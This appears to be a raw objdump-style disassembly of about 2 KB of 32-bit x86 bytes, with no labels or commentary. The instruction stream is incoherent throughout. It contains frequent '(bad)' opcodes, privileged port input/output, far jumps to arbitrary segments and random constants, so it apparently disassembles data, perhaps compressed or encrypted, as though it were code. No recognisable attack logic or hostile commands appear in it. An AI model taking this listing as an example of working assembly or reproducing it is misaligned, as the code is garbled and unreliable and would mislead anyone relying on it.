  40671d:	stos   DWORD PTR es:[edi],eax
  40671e:	pop    esi
  40671f:	inc    esp
  406720:	mov    dl,BYTE PTR [edx-0x7d]
  406723:	imul   esi,ebx,0xffffffbb
  406726:	mov    bx,WORD PTR [ebx+ebp*1+0x15]
  40672b:	xchg   edx,eax
  40672c:	add    dl,BYTE PTR [eax+0x3467ae42]
  406732:	and    DWORD PTR [edi+0x69baaf75],esp
  406738:	adc    BYTE PTR [ebx],cl
  40673a:	xchg   ebx,eax
  40673b:	mov    al,ds:0xac4db4d8
  406740:	mov    ds:0x64b98e77,al
  406745:	jno    0x406755
  406747:	int3   
  406748:	imul   ebp,DWORD PTR [eax+0x79],0x6abaddb3
  40674f:	adc    esi,eax
  406751:	dec    esi
  406752:	and    DWORD PTR [ecx],0x9e0d3ce2
  406758:	inc    ecx
  406759:	out    dx,eax
  40675a:	mov    ds:0x3c54493,al
  40675f:	push   eax
  406760:	adc    BYTE PTR [ebp+0x11],dl
  406763:	adc    esp,edx
  406765:	scas   al,BYTE PTR es:[edi]
  406766:	sbb    al,0x92
  406768:	scas   al,BYTE PTR es:[edi]
  406769:	jmp    0xb3aa:0xac6d62f5
  406770:	div    DWORD PTR [ebx+ebx*4]
  406773:	dec    eax
  406774:	and    eax,0xad49dbab
  406779:	pop    ebp
  40677a:	aam    0x65
  40677c:	or     DWORD PTR [edi],edx
  40677e:	adc    BYTE PTR [ecx],0x2
  406781:	addr16 jg 0x4067d7
  406784:	xchg   ecx,eax
  406785:	push   ebp
  406786:	jg     0x40679c
  406788:	clc    
  406789:	fdivr  st(6),st
  40678b:	jg     0x4067f5
  40678d:	sar    DWORD PTR [edx],1
  40678f:	out    dx,eax
  406790:	mov    ds:0x45c6e664,eax
  406795:	and    DWORD PTR [edi+0x4e],eax
  406798:	mov    esp,0x6857f11
  40679d:	imul   ebp,DWORD PTR [ebx+0x50fda72a],0x1cfdab3e
  4067a7:	push   ebx
  4067a8:	push   ebp
  4067a9:	dec    ebp
  4067aa:	dec    ebp
  4067ab:	dec    esi
  4067ac:	pushf  
  4067ad:	inc    eax
  4067ae:	rcpps  xmm2,XMMWORD PTR [edx+0x4f]
  4067b2:	push   edi
  4067b3:	ficomp DWORD PTR [ebx+esi*2+0x575b49b1]
  4067ba:	ss sbb eax,0x9acc4b0e
  4067c0:	push   ds
  4067c1:	cs inc esi
  4067c3:	and    DWORD PTR [ecx-0x2f],ecx
  4067c6:	mov    DWORD PTR [ebp-0x59],ebx
  4067c9:	outs   dx,DWORD PTR ds:[esi]
  4067ca:	lods   eax,DWORD PTR ds:[esi]
  4067cb:	push   esp
  4067cc:	and    bh,BYTE PTR [ebp+eax*2+0xc]
  4067d0:	sub    eax,0x7b70e54b
  4067d5:	mul    ch
  4067d7:	retf   0x252f
  4067da:	test   ch,dh
  4067dc:	push   0x1acfcbe4
  4067e1:	ficomp WORD PTR [esi-0x2b7a601a]
  4067e7:	sub    BYTE PTR [eax-0x74],ch
  4067ea:	jmp    0xfa1c80e0
  4067ef:	ret    
  4067f0:	xor    DWORD PTR [eax-0xa],0x5e
  4067f4:	shl    edx,1
  4067f6:	idiv   edx
  4067f8:	xchg   edx,eax
  4067f9:	stos   BYTE PTR es:[edi],al
  4067fa:	scas   al,BYTE PTR es:[edi]
  4067fb:	ja     0x406831
  4067fd:	pop    ds
  4067fe:	xchg   esi,eax
  4067ff:	rcr    BYTE PTR [edi+0x29],1
  406802:	mov    BYTE PTR fs:[eax+0x7d],ah
  406806:	push   ecx
  406807:	add    al,0x45
  406809:	mov    edx,0x29fa7d73
  40680e:	lds    eax,FWORD PTR [ebx-0x2c628fc]
  406814:	into   
  406815:	mov    WORD PTR [eax],cs
  406817:	jp     0x406836
  406819:	push   ebx
  40681a:	or     al,0xd9
  40681c:	lds    edx,FWORD PTR [ebx]
  40681e:	gs shl ch,1
  406821:	sub    DWORD PTR [eax+0x62],ebx
  406824:	(bad)  
  406825:	in     al,dx
  406826:	mov    bl,0xaf
  406828:	lods   al,BYTE PTR ds:[esi]
  406829:	mov    ebp,0xee424c94
  40682e:	add    DWORD PTR [ebp-0x65],0x5b
  406832:	adc    edi,DWORD PTR es:[edx]
  406835:	dec    DWORD PTR [esi]
  406837:	push   ecx
  406838:	xchg   ebp,eax
  406839:	add    bh,0xd8
  40683c:	jno    0x406890
  40683e:	or     al,bl
  406840:	and    eax,0xf319a796
  406845:	cdq    
  406846:	mov    ch,BYTE PTR [ecx-0x166afa79]
  40684c:	dec    edx
  40684d:	or     esi,ebp
  40684f:	js     0x4068aa
  406851:	ins    BYTE PTR es:[edi],dx
  406852:	ja     0x406867
  406854:	shr    cl,1
  406856:	data16 (bad) 
  406858:	pop    ebx
  406859:	(bad)  
  40685a:	jle    0x406824
  40685c:	add    BYTE PTR [esi],cl
  40685e:	(bad)  
  40685f:	jl     0x40684b
  406861:	xchg   esp,eax
  406862:	cld    
  406863:	es push 0xfffffffa
  406866:	xchg   DWORD PTR [ebx+edx*1],ebx
  406869:	data16 sbb dl,BYTE PTR [edx]
  40686c:	(bad)  
  40686e:	cmp    ecx,DWORD PTR [edi-0x21]
  406871:	jmp    0xf718:0x5d7b7d17
  406878:	xchg   ebp,eax
  406879:	mov    ebp,0xa9ce25c7
  40687e:	dec    ebp
  40687f:	(bad)  
  406880:	cld    
  406881:	jp     0x4068fc
  406883:	xor    ah,BYTE PTR [edi]
  406885:	sub    al,0x5b
  406887:	lea    eax,[ebp-0x46256c30]
  40688d:	les    ebx,FWORD PTR [edi]
  40688f:	sub    al,0x79
  406891:	cvtdq2ps xmm3,XMMWORD PTR [ebx-0x1e]
  406895:	daa    
  406896:	jo     0x406823
  406898:	or     eax,0x61e774fd
  40689d:	and    ch,ch
  40689f:	fild   QWORD PTR [ebx]
  4068a1:	jle    0x406831
  4068a3:	xor    al,0xd3
  4068a5:	xchg   edi,eax
  4068a6:	pushf  
  4068a7:	sbb    ch,cl
  4068a9:	scas   al,BYTE PTR es:[edi]
  4068aa:	cld    
  4068ab:	es inc eax
  4068ad:	pusha  
  4068ae:	gs pop ebx
  4068b0:	out    dx,eax
  4068b1:	fsub   st(4),st
  4068b3:	adc    esp,0x566a0c08
  4068b9:	stos   BYTE PTR es:[edi],al
  4068ba:	(bad)  
  4068bb:	cld    
  4068bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068bd:	int3   
  4068be:	mul    BYTE PTR [edi+0x29]
  4068c1:	test   DWORD PTR ds:[edi+0xb4a2df4],ebx
  4068c8:	jg     0x40690e
  4068ca:	xchg   edx,eax
  4068cb:	inc    esp
  4068cc:	fadd   QWORD PTR [ecx-0x7d46c017]
  4068d2:	jl     0x40689c
  4068d4:	fnstcw WORD PTR [edx-0x11]
  4068d7:	daa    
  4068d8:	jbe    0x406904
  4068da:	inc    edi
  4068db:	les    edx,FWORD PTR [ebp+0x6c6f6523]
  4068e1:	xor    BYTE PTR fs:[edi+0x41],0x42
  4068e6:	not    DWORD PTR [eax+0x34]
  4068e9:	not    BYTE PTR [ebx]
  4068eb:	dec    ebp
  4068ec:	fs repnz out dx,eax
  4068ef:	inc    esp
  4068f0:	add    dh,BYTE PTR [eax]
  4068f2:	scas   al,BYTE PTR es:[edi]
  4068f3:	clc    
  4068f4:	ror    DWORD PTR [eax],0x56
  4068f7:	inc    esi
  4068f8:	pop    esi
  4068f9:	add    eax,0xf0d11eb2
  4068fe:	push   edi
  4068ff:	mov    esp,0x4c742c84
  406904:	sub    BYTE PTR [ebx],bl
  406906:	hlt    
  406907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406908:	retf   
  406909:	(bad)  
  40690a:	mov    dh,0xc0
  40690c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40690d:	mov    ds:0xb9190dc7,al
  406912:	cld    
  406913:	(bad)  
  406914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406915:	into   
  406916:	jmp    0x7f45:0x695f78f3
  40691d:	dec    esp
  40691e:	je     0x406943
  406920:	test   BYTE PTR [ecx],dl
  406922:	stc    
  406923:	mov    esi,0x56d63191
  406928:	mov    al,ds:0x4446690b
  40692d:	rcr    DWORD PTR [eax+0x6],1
  406930:	pusha  
  406931:	stc    
  406932:	sub    bl,dh
  406934:	mov    BYTE PTR [ebp-0x39ae7688],cl
  40693a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40693b:	(bad)  
  40693c:	fstp   TBYTE PTR [edx]
  40693e:	dec    ebx
  40693f:	push   ebx
  406940:	fistp  DWORD PTR [ebx]
  406942:	enter  0xd379,0x5e
  406946:	lea    edi,[eax+edi*4+0x45]
  40694a:	je     0x4069be
  40694c:	sub    DWORD PTR [edx-0x4a8edd5e],esi
  406952:	dec    edx
  406953:	dec    ebp
  406954:	fnstenv [ecx-0x23f8c5e5]
  40695a:	sub    al,0xa6
  40695d:	retf   0xc329
  406960:	pop    DWORD PTR [ebp-0x3f]
  406963:	icebp  
  406964:	mov    ds:0x2d214925,al
  406969:	xlat   BYTE PTR ds:[ebx]
  40696a:	call   0x3b80364b
  40696f:	add    al,0xa4
  406971:	push   0xa
  406973:	jbe    0x4069d8
  406975:	std    
  406976:	adc    BYTE PTR ds:0x9c043fb4,bh
  40697c:	dec    esp
  40697d:	fisubr DWORD PTR [ebx]
  40697f:	rcl    dh,0x43
  406982:	adc    al,0x50
  406984:	push   0x35b84dbc
  406989:	xchg   esi,eax
  40698a:	cmp    al,0xc4
  40698c:	xor    BYTE PTR [edx+0x56],bl
  40698f:	mov    edi,edx
  406991:	cs inc edi
  406993:	sub    eax,0x6301e421
  406998:	stos   DWORD PTR es:[edi],eax
  406999:	test   eax,0xa7cffbbb
  40699e:	mov    esi,0x59d637a2
  4069a3:	cmp    DWORD PTR [ebx-0x7bf17844],esp
  4069a9:	popf   
  4069aa:	and    ah,BYTE PTR [edx+0x7e31d24c]
  4069b0:	and    eax,0x4baf23b3
  4069b5:	ins    DWORD PTR es:[edi],dx
  4069b6:	out    0xa0,al
  4069b8:	xchg   esi,eax
  4069b9:	xor    bh,BYTE PTR [edx]
  4069bb:	or     eax,0xdd74bb23
  4069c0:	push   ds
  4069c1:	xchg   esi,eax
  4069c2:	xor    BYTE PTR [ebx+0x6c2438a7],dh
  4069c8:	and    DWORD PTR [esi],esp
  4069ca:	cmc    
  4069cb:	stos   BYTE PTR es:[edi],al
  4069cc:	(bad)  
  4069cd:	and    eax,ebx
  4069cf:	loop   0x406a2b
  4069d1:	add    BYTE PTR [edi],ch
  4069d3:	sbb    eax,0x74b7b8
  4069d8:	cmp    al,0xb3
  4069da:	pop    ss
  4069db:	mov    dl,0x63
  4069dd:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4069df:	jnp    0x406a38
  4069e1:	pop    ebp
  4069e2:	pop    es
  4069e3:	mov    ebx,0x14f44b91
  4069e8:	sbb    dl,BYTE PTR [ebx]
  4069ea:	mov    dl,0x98
  4069ec:	je     0x4069aa
  4069ee:	push   ebx
  4069ef:	std    
  4069f0:	mov    WORD PTR [ebx+0x6e],es
  4069f3:	out    0x2f,al
  4069f5:	(bad)  
  4069f6:	dec    edi
  4069f7:	push   0x10
  4069f9:	mov    DWORD PTR [edi],edi
  4069fb:	les    ebx,FWORD PTR [ecx-0x77886682]
  406a01:	inc    edx
  406a02:	in     eax,0x50
  406a04:	out    0xfc,eax
  406a06:	(bad)  
  406a07:	neg    DWORD PTR [edi+0x1b]
  406a0a:	(bad)  
  406a0b:	push   ebx
  406a0c:	sbb    BYTE PTR [esi+0x7c],dl
  406a0f:	xor    al,bh
  406a11:	push   es
  406a12:	cmp    BYTE PTR [esp+eax*4+0x9],al
  406a16:	xor    eax,DWORD PTR [edx+0x726c9577]
  406a1c:	fild   WORD PTR [edi+0x8]
  406a1f:	add    ebp,0x4db2b691
  406a25:	int3   
  406a26:	or     DWORD PTR [edi-0x43],edi
  406a29:	lahf   
  406a2a:	lahf   
  406a2b:	shr    DWORD PTR [edx],0xdd
  406a2e:	in     eax,0x7a
  406a30:	sub    al,0x82
  406a32:	pop    eax
  406a33:	mov    al,0xb4
  406a35:	cmc    
  406a36:	mov    edx,0xb6403496
  406a3b:	dec    edx
  406a3c:	mov    ecx,DWORD PTR [edi-0x4af3b73e]
  406a42:	test   al,0xf9
  406a44:	lea    esi,[bx+di]
  406a47:	pop    ecx
  406a48:	ja     0x406a27
  406a4a:	outs   dx,DWORD PTR ds:[esi]
  406a4b:	dec    esi
  406a4c:	inc    ebp
  406a4d:	adc    ch,ch
  406a4f:	into   
  406a50:	retf   0x92d7
  406a53:	sub    edx,edx
  406a55:	fwait
  406a56:	iret   
  406a57:	adc    al,0x9d
  406a59:	add    eax,0x5b3d73bb
  406a5e:	iret   
  406a5f:	sbb    al,BYTE PTR [ebx+0x2aa45cdf]
  406a65:	ror    DWORD PTR [ecx-0x78af59d9],cl
  406a6b:	jmp    0xc9cd:0x81e27189
  406a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a73:	outs   dx,BYTE PTR ds:[esi]
  406a74:	inc    eax
  406a75:	(bad)  
  406a76:	adc    al,0xc6
  406a78:	ins    BYTE PTR es:[edi],dx
  406a79:	sub    al,0xec
  406a7b:	shl    BYTE PTR [eax+0x72324806],0x5b
  406a82:	pop    edi
  406a83:	mov    cl,0xd
  406a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a86:	aad    0xe7
  406a88:	add    al,0xb5
  406a8a:	and    al,0x21
  406a8c:	add    ecx,DWORD PTR [edx]
  406a8e:	push   cs
  406a8f:	add    eax,0x6464a362
  406a94:	xchg   BYTE PTR [edi],dh
  406a96:	xchg   edi,eax
  406a97:	mov    dh,0x2d
  406a99:	sahf   
  406a9a:	mov    ebx,?
  406a9c:	sub    ebp,DWORD PTR [edx]
  406a9e:	cmp    BYTE PTR [ecx+0x4632c9f4],0x7
  406aa5:	add    BYTE PTR [edx+0x54],0xd5
  406aa9:	call   0x189:0x8343988b
  406ab0:	add    DWORD PTR ds:[eax],edx
  406ab3:	push   0xd60241c
  406ab8:	outs   dx,DWORD PTR ds:[esi]
  406ab9:	sti    
  406aba:	fiadd  WORD PTR [esi]
  406abc:	loopne 0x406a67
  406abe:	fst    DWORD PTR [eax-0x15a4f233]
  406ac4:	rcr    DWORD PTR [edx+0x1dbb7ae8],0x84
  406acb:	in     eax,dx
  406acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406acd:	dec    edx
  406ace:	std    
  406acf:	mov    bh,0x15
  406ad1:	out    dx,al
  406ad2:	xchg   ebx,eax
  406ad3:	int3   
  406ad4:	loopne 0x406af2
  406ad6:	push   0x12
  406ad8:	pop    edi
  406ad9:	mov    bh,0x88
  406adb:	mov    bh,0x1c
  406add:	(bad)  
  406adf:	cmp    DWORD PTR [eax+0x36973f37],ebx
  406ae5:	sub    cl,BYTE PTR [ecx-0x20f5baef]
  406aeb:	loop   0x406ae5
  406aed:	loope  0x406b08
  406aef:	jne    0x406b6e
  406af1:	or     dl,BYTE PTR [esi]
  406af3:	jb     0x406b49
  406af5:	sbb    BYTE PTR [esi+0x62],bl
  406af8:	test   eax,esi
  406afa:	inc    ecx
  406afb:	mov    esp,0xd4fd9c54
  406b00:	inc    eax
  406b01:	adc    BYTE PTR ds:[esi-0x786a29e1],ch
  406b08:	test   eax,0x824384dc
  406b0d:	jg     0x406b57
  406b0f:	jmp    0x3fd:0x98d750ea
  406b16:	sub    DWORD PTR [edx-0x7e],eax
  406b19:	push   cs
  406b1a:	push   ss
  406b1b:	jle    0x406aa5
  406b1d:	call   0x3ac4:0x1fc49ffe
  406b24:	adc    DWORD PTR [eax+0x67b74cd9],edx
  406b2a:	fst    DWORD PTR [ebx]
  406b2c:	loopne 0x406b2d
  406b2e:	(bad)  
  406b2f:	pushf  
  406b30:	out    dx,al
  406b31:	adc    DWORD PTR [edx],ebp
  406b33:	xchg   esp,eax
  406b34:	jno    0x406ae5
  406b36:	out    0xfc,eax
  406b38:	sub    esp,esp
  406b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b3b:	sbb    DWORD PTR ds:0x28ded69a,eax
  406b41:	ds dec ch
  406b44:	test   DWORD PTR ss:[esp+eax*2],ebx
  406b48:	mov    al,ds:0xb60bc064
  406b4d:	ins    BYTE PTR es:[edi],dx
  406b4e:	out    0x74,eax
  406b50:	mov    eax,ds:0xa1cebc98
  406b55:	cmp    al,BYTE PTR [esi-0x441e498c]
  406b5b:	adc    ah,cl
  406b5d:	cmp    eax,0x9a29bd75
  406b62:	fld    QWORD PTR [edi]
  406b64:	repz aaa 
  406b66:	ss ins DWORD PTR es:[edi],dx
  406b68:	mov    fs,ecx
  406b6a:	lds    ebx,FWORD PTR [ebp+0x7b]
  406b6d:	or     cl,0xca
  406b70:	xchg   ecx,eax
  406b71:	mov    ebx,0x6a1798b
  406b76:	pushf  
  406b77:	push   ss
  406b78:	inc    DWORD PTR [esi+0x46]
  406b7b:	(bad)  
  406b7d:	or     BYTE PTR [ebp-0x5585aeb5],bl
  406b83:	mov    dl,0xb5
  406b85:	pushf  
  406b86:	push   ds
  406b87:	int3   
  406b88:	xchg   ebp,eax
  406b89:	das    
  406b8a:	or     ah,al
  406b8c:	cmp    eax,0x30ad812c
  406b91:	xchg   ecx,eax
  406b92:	jae    0x406b56
  406b94:	push   ds
  406b95:	pop    eax
  406b96:	outs   dx,BYTE PTR ds:[esi]
  406b97:	in     al,dx
  406b98:	xchg   ecx,eax
  406b99:	aas    
  406b9a:	lahf   
  406b9b:	jecxz  0x406b34
  406b9d:	pop    ds
  406b9e:	mov    edi,0x87fc0e0b
  406ba3:	inc    esi
  406ba4:	mov    WORD PTR [edx-0x54],ss
  406ba7:	aam    0x87
  406ba9:	loop   0x406c0e
  406bab:	popf   
  406bac:	mov    eax,0xc6c74ac7
  406bb1:	cli    
  406bb2:	pop    eax
  406bb3:	int3   
  406bb4:	mov    ch,0x24
  406bb6:	sbb    DWORD PTR [ebx],edi
  406bb8:	adc    BYTE PTR [esi-0x5c86be90],cl
  406bbe:	pop    edi
  406bbf:	xor    al,0x7a
  406bc1:	cdq    
  406bc2:	sbb    ch,al
  406bc4:	push   ebx
  406bc5:	mov    ah,0x3a
  406bc7:	and    ch,BYTE PTR [esi+0x14]
  406bca:	popf   
  406bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bcc:	adc    edx,esi
  406bce:	dec    ebp
  406bcf:	pop    esp
  406bd0:	inc    DWORD PTR [edi*2+0x138ca015]
  406bd7:	and    al,0xd1
  406bd9:	hlt    
  406bda:	or     eax,DWORD PTR ds:0xa7ae2661
  406be0:	mov    esp,0xb11b11a3
  406be5:	sbb    BYTE PTR [ebp-0x2b213a70],dh
  406beb:	stos   DWORD PTR es:[edi],eax
  406bec:	dec    edx
  406bed:	xor    al,0xa3
  406bef:	scas   al,BYTE PTR es:[edi]
  406bf0:	mov    esp,0xf1f0a7bc
  406bf5:	xor    DWORD PTR [esi+0x39],ebp
  406bf8:	xchg   ebp,edi
  406bfa:	jg     0x406bc6
  406bfc:	fwait
  406bfd:	xchg   esp,eax
  406bfe:	push   ebp
  406bff:	and    dh,al
  406c01:	shl    ebx,1
  406c03:	inc    eax
  406c04:	data16 (bad) 
  406c06:	rol    cl,1
  406c08:	cld    
  406c09:	adc    eax,DWORD PTR [eax+ecx*8]
  406c0c:	mov    edi,gs
  406c0e:	sbb    eax,DWORD PTR fs:[edx+0x5a]
  406c12:	mov    ebx,0x20eb97bf
  406c17:	je     0x406c21
  406c19:	mov    ds:0x840c71a3,al
  406c1e:	add    eax,0x5dd16176
  406c23:	daa    
  406c24:	jl     0x406be8
  406c26:	or     eax,edx
  406c28:	fmul   QWORD PTR [eax-0x2d04d8c9]
  406c2e:	pop    esp
  406c2f:	sti    
  406c30:	scas   al,BYTE PTR es:[edi]
  406c31:	xchg   esp,eax
  406c32:	loop   0x406c3b
  406c34:	fcmovnu st,st(6)
  406c36:	int3   
  406c37:	test   BYTE PTR [esi],0x3c
  406c3a:	in     eax,0xfd
  406c3c:	addr16 push eax
  406c3e:	into   
  406c3f:	pop    edx
  406c40:	cmp    DWORD PTR [ebp+ebx*1+0x4d],0x18
  406c45:	sub    DWORD PTR [ebx+0x48],esi
  406c48:	(bad)  
  406c49:	mov    ebp,0xbc4adb21
  406c4e:	sahf   
  406c4f:	xor    dh,0x10
  406c52:	(bad)  
  406c53:	push   ebp
  406c54:	add    DWORD PTR [ebp+0x43],0xffffffa9
  406c58:	leave  
  406c59:	sub    dh,ch
  406c5b:	xchg   esp,eax
  406c5c:	xchg   ebx,eax
  406c5d:	sub    ebp,edx
  406c5f:	das    
  406c60:	add    ebx,ebp
  406c62:	sub    al,0x7c
  406c64:	jo     0x406bec
  406c66:	shl    BYTE PTR [edx-0x3887ba9e],cl
  406c6c:	aas    
  406c6d:	or     DWORD PTR [eax-0x751c8fa8],0xfb69325c
  406c77:	lock jecxz 0x406c1d
  406c7a:	cmp    BYTE PTR [eax],bh
  406c7c:	test   eax,0x63fe5dc9
  406c81:	add    DWORD PTR [edx-0x7764356e],ebx
  406c87:	or     DWORD PTR [edi-0x12],eax
  406c8a:	push   esp
  406c8b:	popf   
  406c8c:	jmp    0x4f0c:0xafa9432b
  406c93:	pusha  
  406c94:	(bad)  
  406c95:	fdiv   QWORD PTR [ebp+0x6d]
  406c98:	pushf  
  406c99:	sbb    eax,0x91ea3df7
  406c9e:	(bad)  
  406c9f:	mov    eax,ds:0xc6bd270c
  406ca4:	inc    edi
  406ca5:	retf   0x8366
  406ca8:	pop    ecx
  406ca9:	sub    dh,BYTE PTR [eax+0x5fa414b]
  406caf:	inc    ebx
  406cb0:	sar    DWORD PTR [ebx-0x3c610f96],0x25
  406cb7:	jg     0x406c44
  406cb9:	jae    0x406cd5
  406cbb:	fs xchg esi,eax
  406cbd:	stos   DWORD PTR es:[edi],eax
  406cbe:	ret    0xb407
  406cc1:	add    al,0x7a
  406cc3:	repz fcom QWORD PTR [ebx]
  406cc6:	inc    esi
  406cc7:	push   0x14
  406cc9:	or     BYTE PTR [eax-0x7e],cl
  406ccc:	ret    
  406ccd:	push   0xfffffff8
  406ccf:	and    DWORD PTR [ecx-0x7b],ebx
  406cd2:	dec    edi
  406cd3:	mov    al,ds:0xdb80ef09
  406cd8:	ret    
  406cd9:	mov    edi,0x68d07350
  406cde:	add    BYTE PTR [edx-0xe252ea4],dh
  406ce4:	fst    DWORD PTR [ebp-0x4b]
  406ce7:	inc    ecx
  406ce8:	cmp    al,0xca
  406cea:	mov    ds,WORD PTR [esi+ebp*8-0x322dc325]
  406cf1:	call   0x7575:0x2095b5e3
  406cf8:	fbstp  TBYTE PTR [ebx-0x71]
  406cfb:	dec    edx
  406cfc:	icebp  
  406cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cfe:	test   eax,0x692054ea
  406d03:	out    0x52,al
  406d05:	adc    dl,BYTE PTR [edx]
  406d07:	lahf   
  406d08:	ins    DWORD PTR es:[edi],dx
  406d09:	pop    es
  406d0a:	mov    esp,0xcff8c524
  406d0f:	or     DWORD PTR [ebp+0x5c],ebp
  406d12:	pop    es
  406d13:	mov    ah,0xee
  406d15:	mov    esp,0x22199fe3
  406d1a:	mov    bh,0x7b
  406d1c:	out    0x46,al
  406d1e:	mov    ebx,0x4c8d6318
  406d23:	inc    esp
  406d24:	arpl   WORD PTR [esi+ebp*2-0x24],bx
  406d28:	jmp    0xb2d:0x9f5e5e94
  406d2f:	sar    BYTE PTR [ecx],cl
  406d31:	mov    dh,0xc6
  406d33:	or     esp,DWORD PTR [ecx-0x53]
  406d36:	scas   eax,DWORD PTR es:[edi]
  406d37:	loop   0x406d1f
  406d39:	ret    0x4837
  406d3c:	or     dh,0x9c
  406d3f:	out    0x70,al
  406d41:	pop    edx
  406d42:	pop    esp
  406d43:	scas   eax,DWORD PTR es:[edi]
  406d44:	add    al,0xf1
  406d46:	mov    esp,0xc0716a9a
  406d4b:	mov    ah,0x97
  406d4d:	call   0xaa9315b8
  406d52:	shl    DWORD PTR fs:[ebx],1
  406d55:	push   ecx
  406d56:	xor    al,0xf7
  406d58:	in     eax,0x88
  406d5a:	xor    dl,BYTE PTR [edi-0x513e18db]
  406d60:	aam    0xdb
  406d62:	(bad)
  406d66:	sub    dl,0x52
  406d69:	call   FWORD PTR [esi]
  406d6b:	push   ss
  406d6c:	pop    es
  406d6d:	dec    ebp
  406d6e:	call   0xae41:0xfb3627cf
  406d75:	push   eax
  406d76:	ins    DWORD PTR es:[edi],dx
  406d77:	idiv   edx
  406d79:	pop    ebp
  406d7a:	enter  0xb2bc,0xf3
  406d7e:	imul   ebx,DWORD PTR [ecx],0x6c
  406d81:	sbb    dl,cl
  406d83:	sub    edx,edx
  406d85:	ins    BYTE PTR es:[edi],dx
  406d86:	fisttp QWORD PTR [edx+0x74]
  406d89:	aam    0x21
  406d8b:	not    BYTE PTR [ebp-0x56d968d]
  406d91:	mov    eax,0x29c29f41
  406d96:	jg     0x406da1
  406d98:	loop   0x406df2
  406d9a:	inc    esp
  406d9b:	sub    al,0x40
  406d9d:	push   edi
  406d9e:	fs jmp 0xfe5c:0xd26ed045
  406da6:	adc    DWORD PTR [esi-0x3c],eax
  406da9:	ret    0x8c46
  406dac:	in     eax,0xc6
  406dae:	ror    cl,cl
  406db0:	push   edx
  406db1:	or     DWORD PTR [ebx-0x3c],esp
  406db4:	mov    ebp,0xd7845277
  406db9:	xor    BYTE PTR [ecx],ch
  406dbb:	int    0xd0
  406dbd:	out    0x9f,eax
  406dbf:	sub    eax,0x3d1cc6aa
  406dc4:	push   cs
  406dc5:	or     BYTE PTR [eax+eax*8+0x60],dl
  406dc9:	popa   
  406dca:	out    0x48,eax
  406dcc:	lahf   
  406dcd:	scas   al,BYTE PTR es:[edi]
  406dce:	mov    bh,0x32
  406dd0:	cmp    DWORD PTR [edi-0x203c5392],ebx
  406dd6:	(bad)  [ebp-0x5c]
  406dd9:	rcr    BYTE PTR [edi+0x6],0xf3
  406ddd:	pop    eax
  406dde:	arpl   WORD PTR [esi+0x2e879021],ax
  406de4:	jmp    0x406da9
  406de6:	popa   
  406de7:	and    DWORD PTR [edx-0x13961512],edx
  406ded:	adc    al,0x13
  406def:	fist   DWORD PTR [esi]
  406df1:	clc    
  406df2:	retf   
  406df3:	cmp    esi,DWORD PTR [esi+0x5c017c72]
  406df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dfb:	jmp    0xef95179
  406e00:	imul   ebp,DWORD PTR [edx],0xfffffffe
  406e03:	or     eax,0x1ec3975f
  406e08:	adc    al,0x17
  406e0a:	out    0x5,eax
  406e0c:	and    BYTE PTR [ebp+0x27],dl
  406e0f:	rcl    BYTE PTR [edi+ecx*2],0x3
  406e13:	mov    al,0x9a
  406e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e16:	add    BYTE PTR [ebp+0x56],al
  406e19:	xor    ebx,esi
  406e1b:	mov    ebp,eax
  406e1d:	jo     0x406dab
  406e1f:	sbb    bl,BYTE PTR [edi+ebp*4-0xd6833e1]
  406e26:	xlat   BYTE PTR ds:[ebx]
  406e27:	mul    BYTE PTR [ecx-0x747ebe41]
  406e2d:	hlt    
  406e2e:	add    BYTE PTR [ecx+0xe19b68e],bl
  406e34:	jecxz  0x406e7a
  406e36:	inc    edi
  406e37:	ins    DWORD PTR es:[edi],dx
  406e38:	test   DWORD PTR [ecx-0x2d2bd5f7],ecx
  406e3e:	add    al,al
  406e40:	test   eax,0xff533881
  406e45:	push   cs
  406e46:	in     al,dx
  406e47:	push   esp
  406e48:	sbb    BYTE PTR [edi+0x44],cl
  406e4b:	into   
  406e4c:	xor    ch,BYTE PTR [edx]
  406e4e:	add    BYTE PTR [ebx-0x7e],bl
  406e51:	and    DWORD PTR [ebx],ecx
  406e53:	shr    BYTE PTR [esi+0x7493f682],cl
  406e59:	retf   
  406e5a:	stos   DWORD PTR es:[edi],eax
  406e5b:	cld    
  406e5c:	pop    edx
  406e5d:	es push es
  406e5f:	aas    
  406e60:	push   ebp
  406e61:	mov    al,ds:0xeefb07d8
  406e66:	std    
  406e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e68:	scas   al,BYTE PTR es:[edi]
  406e69:	jmp    0xbd222dd2
  406e6e:	xlat   BYTE PTR ds:[ebx]
  406e6f:	ins    DWORD PTR es:[edi],dx
  406e70:	stc    
  406e71:	(bad)  
  406e72:	scas   al,BYTE PTR es:[edi]
  406e73:	add    dl,ah
  406e75:	dec    edi
  406e76:	mov    ecx,0xb03a1d8e
  406e7b:	into   
  406e7c:	sbb    al,0x33
  406e7e:	push   0xffffff9c
  406e80:	mov    ebp,0xae6b1b66
  406e85:	xchg   edi,eax
  406e86:	push   ebx
  406e87:	mov    ch,ah
  406e89:	push   edx
  406e8a:	adc    ebp,esi
  406e8c:	add    al,BYTE PTR [edx-0x37]
  406e8f:	sahf   
  406e90:	jbe    0x406f00
  406e92:	inc    esp
  406e93:	and    ecx,esp
  406e95:	cmc    
  406e96:	stc    
  406e97:	jo     0x406ef8
  406e99:	adc    DWORD PTR [edi],ecx
  406e9b:	add    ch,BYTE PTR [ecx-0x49]
  406e9e:	sub    ecx,DWORD PTR [esi+eiz*8-0x376443f9]
  406ea5:	and    cl,al
  406ea7:	inc    ecx
  406ea8:	pop    edi
  406ea9:	mov    edi,0x57a0b77
  406eae:	mov    dh,0xb3
  406eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
